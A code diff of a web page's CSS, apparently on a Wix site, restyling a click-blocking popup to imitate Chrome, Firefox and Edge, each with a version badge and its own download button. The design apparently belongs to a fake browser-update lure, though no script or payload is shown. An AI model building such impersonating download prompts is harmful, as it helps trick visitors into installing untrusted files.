@@ -3,6 +3,11 @@
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
       <style>
+        
+    @import url('https://fonts.cdnfonts.com/css/google-sans');
+    @import url('https://fonts.cdnfonts.com/css/microsoft-sans-serif');
+    @import url('https://fonts.cdnfonts.com/css/metropolis-2');
+
     /* Block the background from clicking but still allow scrolling */
     body.block-scroll {
       pointer-events: none; /* Disable clicks on the body */
@@ -22,14 +27,14 @@
 
     /* General popup styles */
     .popup {
-      position: fixed;
+      position: fixed; 
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%) scale(0.8); /* Start scaled down */
       padding: 40px;
-      border-radius: 10px;
-      width: 60%; /* Set the popup to take up 60% of the screen */
-      max-width: 800px;
+      border-radius: 25px;
+      width: 100%; /* Set the popup to take up 60% of the screen */
+      max-width: 90%;
       text-align: center;
       box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
       z-index: 9999;
@@ -39,15 +44,32 @@
       transition: all 0.5s ease; /* Smooth transition for opacity and scaling */
     }
 
+    .popupwrapper {
+      display: grid !important;
+      grid-template-columns: 50% 50%;
+
+    }
+
     /* Chrome style */
     .chrome {
       background-color: #fff;
-      border: 4px solid #5f6368;
+      border: 2px solid #adb3bb;
       color: #5f6368;
-      font-family: Google Sans, Arial, Helvetica, sans-serif;
+      font-family: 'Product Sans', sans-serif;
       font-size: 1.25rem;
       font-weight: 400;
       letter-spacing: normal;
+      max-width: 60%;
+    }
+
+    .leftTXT {
+        float: left;
+        font-family: sans-serif;
+    }
+
+    .rightTXT {
+        float: right;       
+
     }
 
     .chromeheader {
@@ -56,7 +78,8 @@
       font-weight: 400;
       letter-spacing: -.5px;
       font-size: 2rem;
-      font-family: Google Sans, Arial, Helvetica, sans-serif;
+      font-family: 'Product Sans Medium', sans-serif;
+
     }
 
     .chromever {
@@ -82,10 +105,40 @@
 
     /* Firefox style */
     .firefox {
-      background-color: #ffcc00;
-      border: 4px solid #e65800;
-      color: #e65800;
-      font-family: 'Segoe UI', sans-serif;
+      background-color: #42414d;
+      color: #f7f4f4;
+      font-family: 'Metropolis', sans-serif;
+      font-size: 1rem;
+      font-weight: 500;
+      letter-spacing: normal;
+      max-width: 50%;
+    }
+
+    .firefoxheader {
+      background-color: #42414d;
+      color: #fbfbfe;
+      font-weight: 400;
+      letter-spacing: -.5px;
+      font-size: 1.75rem;
+      font-family: 'Metropolis', sans-serif;
+      font-weight: 700;
+    }
+
+    .firefoxver {
+    display: inline-block;
+    padding: 10px 10px;
+    position: sticky;
+    top: 16px;
+    transition: top .3s ease;
+    max-width: calc(100% - 32px);
+    width: -moz-fit-content;
+    width: fit-content;
+    background-color: #42414d;
+    color: #f7f4f4;
+    border-radius: 120px;
+    border-color: #00000000;
+    border-width: 5px;
+    z-index: 100;
     }
 
     .firefox img {
@@ -93,47 +146,65 @@
       margin: 20px;
     }
 
-    /* Safari style */
-    .safari {
-      background-color: #f0f0f5;
-      border: 4px solid #007aff;
-      color: #007aff;
-      font-family: 'San Francisco', sans-serif;
-    }
-
-    .safari img {
-      width: 100px;
-      margin: 20px;
-    }
-
     /* Edge style */
     .edge {
-      background-color: #f1f1f1;
-      border: 4px solid #0078d4;
-      color: #0078d4;
-      font-family: 'Segoe UI', sans-serif;
+      background-color: #4b4b4b;
+      color: #f0f0f5;
+      font-family: 'Microsoft Sans Serif', sans-serif;
+      font-size: 1.25rem;
+      font-weight: 400;
+      letter-spacing: normal;
+    }
+
+    .edgeheader {
+      background-color: #4b4b4b;
+      color: #f0f0f5;
+      font-weight: 400;
+      letter-spacing: -.5px;
+      font-size: 2rem;
+      font-family: 'Microsoft Sans Serif', sans-serif;
+    }
+
+    .edgever {
+    display: inline-block;
+    padding: 10px 10px;
+    position: sticky;
+    top: 16px;
+    transition: top .3s ease;
+    max-width: calc(100% - 32px);
+    width: -moz-fit-content;
+    width: fit-content;
+    background-color: #4b4b4b;
+    color: #f0f0f5;
+    border-radius: 120px;
+    border-color: #00000000;
+    border-width: 5px;
+    z-index: 100;
     }
 
     .edge img {
-      width: 100px;
-      margin: 20px;
+        width: 100px;        
     }
 
-    /* Opera style */
-    .opera {
-      background-color: #ff3f5e;
-      border: 4px solid #f06c60;
-      color: #fff;
-      font-family: 'Arial', sans-serif;
+    #edge-pic {
+      width: 20em;
+      margin-left: 40px;
     }
 
-    .opera img {
-      width: 100px;
-      margin: 20px;
+    .imagedemo {
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .div {
+
     }
 
     /* Hyperlink style */
-    .download-link {
+    .chrome-download-link {
         font-size: 1rem;
         line-height: 1.5;
         -moz-osx-font-smoothing: grayscale;
@@ -162,20 +233,121 @@
         background-color: #f6f9fe;
         border-color: #5f6368;
         color: #1a73e8;
-}
+    }
 
-
-    .download-link:hover {
+    .chrome-download-link:hover {
       background-color: #f6f9fe;
       border-color: #1a73e8;
       color: #174ea6;
     }
 
-    .download-link:active {
+    .chrome-download-link:active {
       background-color: #e4eefc;
       border-color: #1a73e8;
       box-shadow: 0 0 0 2px #1a73e8;
       color: #174ea6;
+    }
+
+    .edge-download-link {
+        font-size: 1rem;
+        line-height: 1.5;
+        -moz-osx-font-smoothing: grayscale;
+        -webkit-font-smoothing: antialiased;
+        text-rendering: optimizeLegibility;
+        align-content: center;
+        align-items: center;
+        align-self: flex-start;
+        border: 1px solid transparent;
+        border-radius: 5px;
+        display: inline-flex    ;
+        flex-flow: row nowrap;
+        font-family: 'Microsoft Sans Serif', sans-serif;
+        font-weight: 500;
+        justify-content: space-around;
+        letter-spacing: .5px;
+        margin: 8px 0;
+        max-width: 380px;
+        min-width: 96px;
+        overflow: hidden;
+        padding: 12px 24px;
+        text-align: center;
+        text-decoration: none;
+        transition: background-color .2s, box-shadow .2s, color .2s;
+        vertical-align: middle;
+        background-color: #006cbe;
+        color: #f6f9fe;
+}
+
+    .edge-download-link:hover {
+      background-color: #1a73e8;
+      border-color: #1a73e8;
+      color: #e4eefc;
+    }
+
+    .edge-download-link:active {
+      background-color: #1a73e8;
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px #1a73e8;
+      color: #ffffff;
+    }
+
+    .firefox-download-link {
+        font-size: 1rem;
+        line-height: 1.5;
+        -moz-osx-font-smoothing: grayscale;
+        -webkit-font-smoothing: antialiased;
+        text-rendering: optimizeLegibility;
+        align-content: center;
+        align-items: center;
+        align-self: flex-start;
+        border: 1px solid transparent;
+        border-radius: 5px;
+        display: inline-flex    ;
+        flex-flow: row nowrap;
+        font-family: Mozilla Text,Helvetica Neue,Arial,X-LocaleSpecific,sans-serif;
+        font-weight: 500;
+        justify-content: space-around;
+        letter-spacing: .5px;
+        margin: 8px 0;
+        max-width: 380px;
+        min-width: 96px;
+        overflow: hidden;
+        padding: 12px 24px;
+        text-align: center;
+        text-decoration: none;
+        transition: background-color .2s, box-shadow .2s, color .2s;
+        vertical-align: middle;
+        background-color: #00cadb;
+        color: #1f2a37;
+    }
+
+    .firefox-download-link:hover {
+      background-color: #61dce9;
+      border-color: #61dce9;
+      color: #1f2a37;
+    }
+
+    .firefox-download-link:active {
+      background-color: #a6ecf4;
+      border-color: #a6ecf4;
+      box-shadow: 0 0 0 2px #a6ecf4;
+      color: #1f2a37;
+    }
+
+    .shrinkage {
+        max-width: 70%;
+        text-align: center;
+    }
+
+    .center {
+        text-align: center;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .check {
+        font-size: .8em;
     }
   </style>
 
@@ -194,8 +366,8 @@
   <script>window.viewerModel = JSON.parse(document.getElementById('wix-essential-viewer-model').textContent)</script>
 
   <!-- Initial CSS -->
-  <style data-url="https://static.parastorage.com/services/wix-thunderbolt/dist/main.909b271c.min.css">@keyframes slide-horizontal-new{0%{transform:translateX(100%)}}@keyframes slide-horizontal-old{80%{opacity:1}to{opacity:0;transform:translateX(-100%)}}@keyframes slide-vertical-new{0%{transform:translateY(-100%)}}@keyframes slide-vertical-old{80%{opacity:1}to{opacity:0;transform:translateY(100%)}}@keyframes out-in-new{0%{opacity:0}}@keyframes out-in-old{to{opacity:0}}html[data-page-transition=SlideHorizontal]::view-transition-old(page-group){animation:slide-horizontal-old .6s cubic-bezier(.83,0,.17,1) forwards;mix-blend-mode:normal}html[data-page-transition=SlideHorizontal]::view-transition-new(page-group){animation:slide-horizontal-new .6s cubic-bezier(.83,0,.17,1) backwards;mix-blend-mode:normal}html[data-page-transition=SlideVertical]::view-transition-old(page-group){animation:slide-vertical-old .6s cubic-bezier(.83,0,.17,1) forwards;mix-blend-mode:normal}html[data-page-transition=SlideVertical]::view-transition-new(page-group){animation:slide-vertical-new .6s cubic-bezier(.83,0,.17,1) backwards;mix-blend-mode:normal}html[data-page-transition=OutIn]::view-transition-old(page-group){animation:out-in-old .35s cubic-bezier(.64,0,.78,0) forwards}html[data-page-transition=OutIn]::view-transition-new(page-group){animation:out-in-new .35s cubic-bezier(.22,1,.36,1) .35s backwards}@media(prefers-reduced-motion:reduce){::view-transition-group(*),::view-transition-new(*),::view-transition-old(*){animation:none!important}}body,html{background:transparent;border:0;margin:0;outline:0;padding:0;vertical-align:baseline}body{--scrollbar-width:0px;font-family:Arial,Helvetica,sans-serif;font-size:10px}body,html{height:100%}body{overflow-x:auto;overflow-y:scroll}body:not(.responsive) #site-root{min-width:var(--site-width);width:100%}body:not([data-js-loaded]) [data-hide-prejs]{visibility:hidden}wix-interact-element{display:contents}#SITE_CONTAINER{position:relative}:root{--one-unit:1vw;--section-max-width:9999px;--spx-stopper-max:9999px;--spx-stopper-min:0px}@supports(-webkit-appearance:none) and (stroke-color:transparent){:root{--safari-sticky-fix:opacity}}@supports(container-type:inline-size){:root{--one-unit:1cqw}}[id^=oldHoverBox-]{mix-blend-mode:plus-lighter;transition:opacity .5s ease,visibility .5s ease}[data-mesh-id$=inlineContent-gridContainer]:has(>[id^=oldHoverBox-]){isolation:isolate}</style>
-<style data-url="https://static.parastorage.com/services/wix-thunderbolt/dist/main.renderer.beea92dc.min.css">a,abbr,acronym,address,applet,b,big,blockquote,button,caption,center,cite,code,dd,del,dfn,div,dl,dt,em,fieldset,font,footer,form,h1,h2,h3,h4,h5,h6,header,i,iframe,img,ins,kbd,label,legend,li,nav,object,ol,p,pre,q,s,samp,section,small,span,strike,strong,sub,sup,table,tbody,td,tfoot,th,thead,title,tr,tt,u,ul,var{background:transparent;border:0;margin:0;outline:0;padding:0;vertical-align:baseline}input,select,textarea{box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}ol,ul{list-style:none}blockquote,q{quotes:none}ins{text-decoration:none}del{text-decoration:line-through}table{border-collapse:collapse;border-spacing:0}a{cursor:pointer;color: white;text-decoration:none}.testStyles{overflow-y:hidden}.reset-button{-webkit-appearance:none;background:none;border:0;color:inherit;font:inherit;line-height:normal;outline:0;overflow:visible;padding:0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}:focus{outline:none}body.device-mobile-optimized:not(.disable-site-overflow){overflow-x:hidden;overflow-y:scroll}body.device-mobile-optimized:not(.responsive) #SITE_CONTAINER{margin-left:auto;margin-right:auto;overflow-x:visible;position:relative;width:320px}body.device-mobile-optimized:not(.responsive):not(.blockSiteScrolling) #SITE_CONTAINER{margin-top:0}body.device-mobile-optimized>*{max-width:100%!important}body.device-mobile-optimized #site-root{overflow-x:hidden;overflow-y:hidden}@supports(overflow:clip){body.device-mobile-optimized #site-root{overflow-x:clip;overflow-y:clip}}body.device-mobile-non-optimized #SITE_CONTAINER #site-root:not(.overflow-clip-in-mobile){overflow-x:hidden;overflow-y:auto}body.device-mobile-non-optimized #SITE_CONTAINER #site-root.overflow-clip-in-mobile{overflow-x:clip;overflow-y:clip}body.device-mobile-non-optimized.fullScreenMode{background-color:#5f6360}body.device-mobile-non-optimized.fullScreenMode #MOBILE_ACTIONS_MENU,body.device-mobile-non-optimized.fullScreenMode #SITE_BACKGROUND,body.device-mobile-non-optimized.fullScreenMode #site-root,body.fullScreenMode #WIX_ADS{visibility:hidden}body.fullScreenMode{overflow-x:hidden!important;overflow-y:hidden!important}body.fullScreenMode.device-mobile-optimized #TINY_MENU{opacity:0;pointer-events:none}body.fullScreenMode-scrollable.device-mobile-optimized{overflow-x:hidden!important;overflow-y:auto!important}body.fullScreenMode-scrollable.device-mobile-optimized #masterPage,body.fullScreenMode-scrollable.device-mobile-optimized #site-root{overflow-x:hidden!important;overflow-y:hidden!important}body.fullScreenMode-scrollable.device-mobile-optimized #SITE_BACKGROUND,body.fullScreenMode-scrollable.device-mobile-optimized #masterPage{height:auto!important}body.fullScreenMode-scrollable.device-mobile-optimized #masterPage.mesh-layout{height:0!important}body.blockSiteScrolling,body.siteScrollingBlocked{position:fixed;width:100%}body.blockSiteScrolling #SITE_CONTAINER{margin-top:calc(var(--blocked-site-scroll-margin-top)*-1)}body.blockSiteScrolling:not(.responsive) #WIX_ADS{margin-top:var(--blocked-site-scroll-margin-top)}#site-root{margin:0 auto;min-height:100%;position:relative;top:var(--wix-ads-height)}#site-root img:not([src]){visibility:hidden}#site-root svg img:not([src]){visibility:visible}.auto-generated-link{color:inherit}#SCROLL_TO_BOTTOM,#SCROLL_TO_TOP{height:0}.has-click-trigger{cursor:pointer}.fullScreenOverlay{bottom:0;display:flex;justify-content:center;left:0;overflow-y:hidden;position:fixed;right:0;top:-60px;z-index:1005}.fullScreenOverlay>.fullScreenOverlayContent{bottom:0;left:0;margin:0 auto;overflow:hidden;position:absolute;right:0;top:60px;transform:translateZ(0)}[data-mesh-id$=centeredContent],[data-mesh-id$=form],[data-mesh-id$=inlineContent]{pointer-events:none;position:relative}[data-mesh-id$=-gridWrapper],[data-mesh-id$=-rotated-wrapper]{pointer-events:none}[data-mesh-id$=-gridContainer]>*,[data-mesh-id$=-rotated-wrapper]>*,[data-mesh-id$=inlineContent]>:not([data-mesh-id$=-gridContainer]){pointer-events:auto}.device-mobile-optimized #masterPage.mesh-layout #SOSP_CONTAINER_CUSTOM_ID{grid-area:2/1/3/2;-ms-grid-row:2;position:relative}#masterPage.mesh-layout{-ms-grid-rows:max-content max-content min-content max-content;-ms-grid-columns:100%;align-items:start;display:-ms-grid;display:grid;grid-template-columns:100%;grid-template-rows:max-content max-content min-content max-content;justify-content:stretch}#masterPage.mesh-layout #PAGES_CONTAINER,#masterPage.mesh-layout #SITE_FOOTER-placeholder,#masterPage.mesh-layout #SITE_FOOTER_WRAPPER,#masterPage.mesh-layout #SITE_HEADER-placeholder,#masterPage.mesh-layout #SITE_HEADER_WRAPPER,#masterPage.mesh-layout #SOSP_CONTAINER_CUSTOM_ID[data-state~=mobileView],#masterPage.mesh-layout #soapAfterPagesContainer,#masterPage.mesh-layout #soapBeforePagesContainer{-ms-grid-row-align:start;-ms-grid-column-align:start;-ms-grid-column:1}#masterPage.mesh-layout #SITE_HEADER-placeholder,#masterPage.mesh-layout #SITE_HEADER_WRAPPER{grid-area:1/1/2/2;-ms-grid-row:1}#masterPage.mesh-layout #PAGES_CONTAINER,#masterPage.mesh-layout #soapAfterPagesContainer,#masterPage.mesh-layout #soapBeforePagesContainer{grid-area:3/1/4/2;-ms-grid-row:3}#masterPage.mesh-layout #soapAfterPagesContainer,#masterPage.mesh-layout #soapBeforePagesContainer{width:100%}#masterPage.mesh-layout #PAGES_CONTAINER{align-self:stretch}#masterPage.mesh-layout main#PAGES_CONTAINER{display:block}#masterPage.mesh-layout #SITE_FOOTER-placeholder,#masterPage.mesh-layout #SITE_FOOTER_WRAPPER{grid-area:4/1/5/2;-ms-grid-row:4}#masterPage.mesh-layout #SITE_PAGES,#masterPage.mesh-layout [data-mesh-id=PAGES_CONTAINERcenteredContent],#masterPage.mesh-layout [data-mesh-id=PAGES_CONTAINERinlineContent]{height:100%}#masterPage.mesh-layout.desktop>*{width:100%}#masterPage.mesh-layout #PAGES_CONTAINER,#masterPage.mesh-layout #SITE_FOOTER_WRAPPER,#masterPage.mesh-layout #SITE_HEADER_WRAPPER,#masterPage.mesh-layout #SITE_PAGES,#masterPage.mesh-layout #masterPageinlineContent,#masterPage.mesh-layout:not(.one-doc) #SITE_FOOTER,#masterPage.mesh-layout:not(.one-doc) #SITE_HEADER{position:relative}#masterPage.mesh-layout #SITE_HEADER{grid-area:1/1/2/2}#masterPage.mesh-layout #SITE_FOOTER{grid-area:4/1/5/2}#masterPage.mesh-layout.overflow-x-clip #SITE_FOOTER,#masterPage.mesh-layout.overflow-x-clip #SITE_HEADER{overflow-x:clip}[data-z-counter]{z-index:0}[data-z-counter="0"]{z-index:auto}.wixSiteProperties{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}:root{--wst-button-color-fill-primary:rgb(var(--color_48));--wst-button-color-border-primary:rgb(var(--color_49));--wst-button-color-text-primary:rgb(var(--color_50));--wst-button-color-fill-primary-hover:rgb(var(--color_51));--wst-button-color-border-primary-hover:rgb(var(--color_52));--wst-button-color-text-primary-hover:rgb(var(--color_53));--wst-button-color-fill-primary-disabled:rgb(var(--color_54));--wst-button-color-border-primary-disabled:rgb(var(--color_55));--wst-button-color-text-primary-disabled:rgb(var(--color_56));--wst-button-color-fill-secondary:rgb(var(--color_57));--wst-button-color-border-secondary:rgb(var(--color_58));--wst-button-color-text-secondary:rgb(var(--color_59));--wst-button-color-fill-secondary-hover:rgb(var(--color_60));--wst-button-color-border-secondary-hover:rgb(var(--color_61));--wst-button-color-text-secondary-hover:rgb(var(--color_62));--wst-button-color-fill-secondary-disabled:rgb(var(--color_63));--wst-button-color-border-secondary-disabled:rgb(var(--color_64));--wst-button-color-text-secondary-disabled:rgb(var(--color_65));--wst-color-fill-base-1:rgb(var(--color_36));--wst-color-fill-base-2:rgb(var(--color_37));--wst-color-fill-base-shade-1:rgb(var(--color_38));--wst-color-fill-base-shade-2:rgb(var(--color_39));--wst-color-fill-base-shade-3:rgb(var(--color_40));--wst-color-fill-accent-1:rgb(var(--color_41));--wst-color-fill-accent-2:rgb(var(--color_42));--wst-color-fill-accent-3:rgb(var(--color_43));--wst-color-fill-accent-4:rgb(var(--color_44));--wst-color-fill-background-primary:rgb(var(--color_11));--wst-color-fill-background-secondary:rgb(var(--color_12));--wst-color-text-primary:rgb(var(--color_15));--wst-color-text-secondary:rgb(var(--color_14));--wst-color-action:rgb(var(--color_18));--wst-color-disabled:rgb(var(--color_39));--wst-color-title:rgb(var(--color_45));--wst-color-subtitle:rgb(var(--color_46));--wst-color-line:rgb(var(--color_47));--wst-font-style-h2:var(--font_2);--wst-font-style-h3:var(--font_3);--wst-font-style-h4:var(--font_4);--wst-font-style-h5:var(--font_5);--wst-font-style-h6:var(--font_6);--wst-font-style-body-large:var(--font_7);--wst-font-style-body-medium:var(--font_8);--wst-font-style-body-small:var(--font_9);--wst-font-style-body-x-small:var(--font_10);--wst-color-custom-1:rgb(var(--color_13));--wst-color-custom-2:rgb(var(--color_16));--wst-color-custom-3:rgb(var(--color_17));--wst-color-custom-4:rgb(var(--color_19));--wst-color-custom-5:rgb(var(--color_20));--wst-color-custom-6:rgb(var(--color_21));--wst-color-custom-7:rgb(var(--color_22));--wst-color-custom-8:rgb(var(--color_23));--wst-color-custom-9:rgb(var(--color_24));--wst-color-custom-10:rgb(var(--color_25));--wst-color-custom-11:rgb(var(--color_26));--wst-color-custom-12:rgb(var(--color_27));--wst-color-custom-13:rgb(var(--color_28));--wst-color-custom-14:rgb(var(--color_29));--wst-color-custom-15:rgb(var(--color_30));--wst-color-custom-16:rgb(var(--color_31));--wst-color-custom-17:rgb(var(--color_32));--wst-color-custom-18:rgb(var(--color_33));--wst-color-custom-19:rgb(var(--color_34));--wst-color-custom-20:rgb(var(--color_35))}</style>
+  <style data-url="https://static.parastorage.com/services/wix-thunderbolt/dist/main.909b271c.min.css">@keyframes slide-horizontal-new{0%{transform:translateX(100%)}}@keyframes slide-horizontal-old{80%{opacity:1}to{opacity:0;transform:translateX(-100%)}}@keyframes slide-vertical-new{0%{transform:translateY(-100%)}}@keyframes slide-vertical-old{80%{opacity:1}to{opacity:0;transform:translateY(100%)}}@keyframes out-in-new{0%{opacity:0}}@keyframes out-in-old{to{opacity:0}}html[data-page-transition=SlideHorizontal]::view-transition-old(page-group){animation:slide-horizontal-old .6s cubic-bezier(.83,0,.17,1) forwards;mix-blend-mode:normal}html[data-page-transition=SlideHorizontal]::view-transition-new(page-group){animation:slide-horizontal-new .6s cubic-bezier(.83,0,.17,1) backwards;mix-blend-mode:normal}html[data-page-transition=SlideVertical]::view-transition-old(page-group){animation:slide-vertical-old .6s cubic-bezier(.83,0,.17,1) forwards;mix-blend-mode:normal}html[data-page-transition=SlideVertical]::view-transition-new(page-group){animation:slide-vertical-new .6s cubic-bezier(.83,0,.17,1) backwards;mix-blend-mode:normal}html[data-page-transition=OutIn]::view-transition-old(page-group){animation:out-in-old .35s cubic-bezier(.64,0,.78,0) forwards}html[data-page-transition=OutIn]::view-transition-new(page-group){animation:out-in-new .35s cubic-bezier(.22,1,.36,1) .35s backwards}@media(prefers-reduced-motion:reduce){::view-transition-group(*),::view-transition-new(*),::view-transition-old(*){animation:none!important}}body,html{background:transparent;border:0;margin:0;outline:0;padding:0;vertical-align:baseline}body{--scrollbar-width:0px;font-size:10px}body,html{height:100%}body{overflow-x:auto;overflow-y:scroll}body:not(.responsive) #site-root{min-width:var(--site-width);width:100%}body:not([data-js-loaded]) [data-hide-prejs]{visibility:hidden}wix-interact-element{display:contents}#SITE_CONTAINER{position:relative}:root{--one-unit:1vw;--section-max-width:9999px;--spx-stopper-max:9999px;--spx-stopper-min:0px}@supports(-webkit-appearance:none) and (stroke-color:transparent){:root{--safari-sticky-fix:opacity}}@supports(container-type:inline-size){:root{--one-unit:1cqw}}[id^=oldHoverBox-]{mix-blend-mode:plus-lighter;transition:opacity .5s ease,visibility .5s ease}[data-mesh-id$=inlineContent-gridContainer]:has(>[id^=oldHoverBox-]){isolation:isolate}</style>
+<style data-url="https://static.parastorage.com/services/wix-thunderbolt/dist/main.renderer.beea92dc.min.css">a,abbr,acronym,address,applet,b,big,blockquote,button,caption,center,cite,code,dd,del,dfn,div,dl,dt,em,fieldset,font,footer,form,h1,h2,h3,h4,h5,h6,header,i,iframe,img,ins,kbd,label,legend,li,nav,object,ol,p,pre,q,s,samp,section,small,span,strike,strong,sub,sup,table,tbody,td,tfoot,th,thead,title,tr,tt,u,ul,var{background:transparent;border:0;margin:0;outline:0;padding:0;vertical-align:baseline}input,select,textarea{box-sizing:border-box;vertical-align: middle;font-family:Helvetica,Arial,sans-serif}ol,ul{list-style:none}blockquote,q{quotes:none}ins{text-decoration:none}del{text-decoration:line-through}table{border-collapse:collapse;border-spacing:0}a{cursor:pointer;color: white;text-decoration:none}.testStyles{overflow-y:hidden}.reset-button{-webkit-appearance:none;background:none;border:0;color:inherit;font:inherit;line-height:normal;outline:0;overflow:visible;padding:0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}:focus{outline:none}body.device-mobile-optimized:not(.disable-site-overflow){overflow-x:hidden;overflow-y:scroll}body.device-mobile-optimized:not(.responsive) #SITE_CONTAINER{margin-left:auto;margin-right:auto;overflow-x:visible;position:relative;width:320px}body.device-mobile-optimized:not(.responsive):not(.blockSiteScrolling) #SITE_CONTAINER{margin-top:0}body.device-mobile-optimized>*{max-width:100%!important}body.device-mobile-optimized #site-root{overflow-x:hidden;overflow-y:hidden}@supports(overflow:clip){body.device-mobile-optimized #site-root{overflow-x:clip;overflow-y:clip}}body.device-mobile-non-optimized #SITE_CONTAINER #site-root:not(.overflow-clip-in-mobile){overflow-x:hidden;overflow-y:auto}body.device-mobile-non-optimized #SITE_CONTAINER #site-root.overflow-clip-in-mobile{overflow-x:clip;overflow-y:clip}body.device-mobile-non-optimized.fullScreenMode{background-color:#5f6360}body.device-mobile-non-optimized.fullScreenMode #MOBILE_ACTIONS_MENU,body.device-mobile-non-optimized.fullScreenMode #SITE_BACKGROUND,body.device-mobile-non-optimized.fullScreenMode #site-root,body.fullScreenMode #WIX_ADS{visibility:hidden}body.fullScreenMode{overflow-x:hidden!important;overflow-y:hidden!important}body.fullScreenMode.device-mobile-optimized #TINY_MENU{opacity:0;pointer-events:none}body.fullScreenMode-scrollable.device-mobile-optimized{overflow-x:hidden!important;overflow-y:auto!important}body.fullScreenMode-scrollable.device-mobile-optimized #masterPage,body.fullScreenMode-scrollable.device-mobile-optimized #site-root{overflow-x:hidden!important;overflow-y:hidden!important}body.fullScreenMode-scrollable.device-mobile-optimized #SITE_BACKGROUND,body.fullScreenMode-scrollable.device-mobile-optimized #masterPage{height:auto!important}body.fullScreenMode-scrollable.device-mobile-optimized #masterPage.mesh-layout{height:0!important}body.blockSiteScrolling,body.siteScrollingBlocked{position:fixed;width:100%}body.blockSiteScrolling #SITE_CONTAINER{margin-top:calc(var(--blocked-site-scroll-margin-top)*-1)}body.blockSiteScrolling:not(.responsive) #WIX_ADS{margin-top:var(--blocked-site-scroll-margin-top)}#site-root{margin:0 auto;min-height:100%;position:relative;top:var(--wix-ads-height)}#site-root img:not([src]){visibility:hidden}#site-root svg img:not([src]){visibility:visible}.auto-generated-link{color:inherit}#SCROLL_TO_BOTTOM,#SCROLL_TO_TOP{height:0}.has-click-trigger{cursor:pointer}.fullScreenOverlay{bottom:0;display:flex;justify-content:center;left:0;overflow-y:hidden;position:fixed;right:0;top:-60px;z-index:1005}.fullScreenOverlay>.fullScreenOverlayContent{bottom:0;left:0;margin:0 auto;overflow:hidden;position:absolute;right:0;top:60px;transform:translateZ(0)}[data-mesh-id$=centeredContent],[data-mesh-id$=form],[data-mesh-id$=inlineContent]{pointer-events:none;position:relative}[data-mesh-id$=-gridWrapper],[data-mesh-id$=-rotated-wrapper]{pointer-events:none}[data-mesh-id$=-gridContainer]>*,[data-mesh-id$=-rotated-wrapper]>*,[data-mesh-id$=inlineContent]>:not([data-mesh-id$=-gridContainer]){pointer-events:auto}.device-mobile-optimized #masterPage.mesh-layout #SOSP_CONTAINER_CUSTOM_ID{grid-area:2/1/3/2;-ms-grid-row:2;position:relative}#masterPage.mesh-layout{-ms-grid-rows:max-content max-content min-content max-content;-ms-grid-columns:100%;align-items:start;display:-ms-grid;display:grid;grid-template-columns:100%;grid-template-rows:max-content max-content min-content max-content;justify-content:stretch}#masterPage.mesh-layout #PAGES_CONTAINER,#masterPage.mesh-layout #SITE_FOOTER-placeholder,#masterPage.mesh-layout #SITE_FOOTER_WRAPPER,#masterPage.mesh-layout #SITE_HEADER-placeholder,#masterPage.mesh-layout #SITE_HEADER_WRAPPER,#masterPage.mesh-layout #SOSP_CONTAINER_CUSTOM_ID[data-state~=mobileView],#masterPage.mesh-layout #soapAfterPagesContainer,#masterPage.mesh-layout #soapBeforePagesContainer{-ms-grid-row-align:start;-ms-grid-column-align:start;-ms-grid-column:1}#masterPage.mesh-layout #SITE_HEADER-placeholder,#masterPage.mesh-layout #SITE_HEADER_WRAPPER{grid-area:1/1/2/2;-ms-grid-row:1}#masterPage.mesh-layout #PAGES_CONTAINER,#masterPage.mesh-layout #soapAfterPagesContainer,#masterPage.mesh-layout #soapBeforePagesContainer{grid-area:3/1/4/2;-ms-grid-row:3}#masterPage.mesh-layout #soapAfterPagesContainer,#masterPage.mesh-layout #soapBeforePagesContainer{width:100%}#masterPage.mesh-layout #PAGES_CONTAINER{align-self:stretch}#masterPage.mesh-layout main#PAGES_CONTAINER{display:block}#masterPage.mesh-layout #SITE_FOOTER-placeholder,#masterPage.mesh-layout #SITE_FOOTER_WRAPPER{grid-area:4/1/5/2;-ms-grid-row:4}#masterPage.mesh-layout #SITE_PAGES,#masterPage.mesh-layout [data-mesh-id=PAGES_CONTAINERcenteredContent],#masterPage.mesh-layout [data-mesh-id=PAGES_CONTAINERinlineContent]{height:100%}#masterPage.mesh-layout.desktop>*{width:100%}#masterPage.mesh-layout #PAGES_CONTAINER,#masterPage.mesh-layout #SITE_FOOTER_WRAPPER,#masterPage.mesh-layout #SITE_HEADER_WRAPPER,#masterPage.mesh-layout #SITE_PAGES,#masterPage.mesh-layout #masterPageinlineContent,#masterPage.mesh-layout:not(.one-doc) #SITE_FOOTER,#masterPage.mesh-layout:not(.one-doc) #SITE_HEADER{position:relative}#masterPage.mesh-layout #SITE_HEADER{grid-area:1/1/2/2}#masterPage.mesh-layout #SITE_FOOTER{grid-area:4/1/5/2}#masterPage.mesh-layout.overflow-x-clip #SITE_FOOTER,#masterPage.mesh-layout.overflow-x-clip #SITE_HEADER{overflow-x:clip}[data-z-counter]{z-index:0}[data-z-counter="0"]{z-index:auto}.wixSiteProperties{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}:root{--wst-button-color-fill-primary:rgb(var(--color_48));--wst-button-color-border-primary:rgb(var(--color_49));--wst-button-color-text-primary:rgb(var(--color_50));--wst-button-color-fill-primary-hover:rgb(var(--color_51));--wst-button-color-border-primary-hover:rgb(var(--color_52));--wst-button-color-text-primary-hover:rgb(var(--color_53));--wst-button-color-fill-primary-disabled:rgb(var(--color_54));--wst-button-color-border-primary-disabled:rgb(var(--color_55));--wst-button-color-text-primary-disabled:rgb(var(--color_56));--wst-button-color-fill-secondary:rgb(var(--color_57));--wst-button-color-border-secondary:rgb(var(--color_58));--wst-button-color-text-secondary:rgb(var(--color_59));--wst-button-color-fill-secondary-hover:rgb(var(--color_60));--wst-button-color-border-secondary-hover:rgb(var(--color_61));--wst-button-color-text-secondary-hover:rgb(var(--color_62));--wst-button-color-fill-secondary-disabled:rgb(var(--color_63));--wst-button-color-border-secondary-disabled:rgb(var(--color_64));--wst-button-color-text-secondary-disabled:rgb(var(--color_65));--wst-color-fill-base-1:rgb(var(--color_36));--wst